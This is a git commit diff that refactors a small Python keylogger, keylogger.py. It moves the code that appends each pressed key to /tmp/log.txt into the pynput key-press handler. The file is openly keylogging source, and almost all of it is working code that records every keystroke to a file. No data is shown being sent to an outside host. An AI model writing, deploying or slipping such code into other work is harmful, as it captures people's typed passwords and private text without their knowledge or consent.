1993faecb918880b21b4e254e445a8b1dcc57743
Shreyansh Singh <45299337+k4m1k4z13r@users.noreply.github.com>
2019-03-22 11:43:20 +0530

    update keylogger code
    save CPU time and decrease code redundancy by getting the log to file stuff done in the _pressed instead of another function

--- keylogger.py
+++ keylogger.py
@@ -1,13 +1,9 @@
 #k4m1k4z13r wuz here
 from pynput.keyboard import Key, Listener
 
-
-def log(key): #log the keys iteratively into a file
+def _pressed(key): #when a key is pressed
 	with open('/tmp/log.txt','a') as f: #open log file in append mode
 		f.write(str(key)+"\n") #write the key to the log file
-
-def _pressed(key): #when a key is pressed
-	log(key) #log that key immediately
 
 def _released(key): #when a key is released
 	pass #do nothing
